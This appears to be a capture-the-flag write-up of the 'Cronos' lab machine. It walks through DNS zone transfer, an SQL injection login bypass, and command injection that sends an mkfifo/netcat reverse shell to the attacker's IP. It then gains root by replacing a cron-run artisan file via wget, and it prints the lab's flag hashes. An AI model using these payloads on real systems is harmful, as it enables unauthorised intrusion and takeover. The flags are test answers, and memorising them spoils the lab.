## Initial NMAP:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ nmap 10.129.227.211 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-26 09:40 +0545
Nmap scan report for 10.129.227.211
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 835.53 seconds
```

## DNS Enumeration:

Since the DNS port is open, we can use `host 10.129.227.211 10.129.227.211` to ask the DNS server about itself.
```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ host 10.129.227.211 10.129.227.211 
Using domain server:
Name: 10.129.227.211
Address: 10.129.227.211#53
Aliases: 

211.227.129.10.in-addr.arpa domain name pointer ns1.cronos.htb.
```

We know the nameserver is aliased to `ns1.cronos.htb` and the DNS zone it's hosting is `cronos.htb`. Let's Check for Zone Transfer:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ host -l cronos.htb 10.129.227.211 
Using domain server:
Name: 10.129.227.211
Address: 10.129.227.211#53
Aliases: 

cronos.htb name server ns1.cronos.htb.
cronos.htb has address 10.10.10.13
admin.cronos.htb has address 10.10.10.13
ns1.cronos.htb has address 10.10.10.13
www.cronos.htb has address 10.10.10.13
```

We can see that there is a subdomain `admin.cronos.htb` which is aliased to the same IP as `cronos.htb`. Let's add this to our `/etc/hosts` file and start our enumeration over admin.cronos.htb.

## Web Enumeration:

Opening `http://admin.cronos.htb` gives us a login page. After trying things out, we can see that the login page is vulnerable to SQL Injection.
`admin'or''='` can be used to bypass the login page.

After login bypass, we can see there's a `Net Tool v0.1` in this menue which is used to execute ping or traceroute commands. Below is the request when we execute ping command:

```bash
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://admin.cronos.htb
Connection: close
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=1jj7dkulkcnpdgjfvdbrs6me27
Upgrade-Insecure-Requests: 1

command=traceroute&host=8.8.8.8
```

We can already sense command injection here, adding `;ls` after host parameter gives us the output of `ls` command. We can use this to get a reverse shell.

## Shell as www-data:

```bash
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: http://admin.cronos.htb
Connection: close
Referer: http://admin.cronos.htb/welcome.php
Cookie: PHPSESSID=1jj7dkulkcnpdgjfvdbrs6me27
Upgrade-Insecure-Requests: 1

command=traceroute&host=8.8.8.8;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.92+1234+>/tmp/f

┌──(parallels㉿V35HR4J)-[~]
└─$ nc -lnvp 1234 
listening on [any] 1234 ...
connect to [10.10.14.92] from (UNKNOWN) [10.129.227.211] 57076
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

running pspy, we can see that there's a cronjob running as root on some intresting file:

```bash
2023/12/26 06:33:01 CMD: UID=0     PID=12607  | /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1 
```

The file `/var/www/laravel/artisan` is owned by www-data and we can edit the file:

```bash
www-data@cronos:/var/www/admin$ ls -la /var/www/laravel/artisan
ls -la /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

We can replace the file with a reverse shell and wait for the cronjob to run:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Cronos]
└─$ ls
artisan
                                                                                                                                                                                
┌──(parallels㉿V35HR4J)-[~/tjnull/Cronos]
└─$ srv 80
Python3 HTTP server started on 10.10.14.92:80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.211 - - [26/Dec/2023 10:25:51] "GET /artisan HTTP/1.1" 200 -


www-data@cronos:/var/www/laravel$ rm artisan
rm artisan
www-data@cronos:/var/www/laravel$ wget 10.10.14.92:80/artisan
wget 10.10.14.92:80/artisan
--2023-12-26 06:40:51--  http://10.10.14.92/artisan
Connecting to 10.10.14.92:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2585 (2.5K) [application/octet-stream]
Saving to: 'artisan'

artisan             100%[===================>]   2.52K  --.-KB/s    in 0s      

2023-12-26 06:40:52 (486 MB/s) - 'artisan' saved [2585/2585]

┌──(parallels㉿V35HR4J)-[~/tjnull/Cronos]
└─$ nc -lnvp 1234 
listening on [any] 1234 ...
connect to [10.10.14.92] from (UNKNOWN) [10.129.227.211] 57084
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 06:41:02 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
sh: 0: can't access tty; job control turned off
# whoami
root
# find / -name user.txt -exec cat {} \; -o -name root.txt -exec cat {} \;
4d2605f80dbed7c01a2204af323d619b
0ea8f38beae622d6311a1305a5e7380e
```

# Takeaways:
- Always check for DNS Zone Transfer, it might give you some intresting information.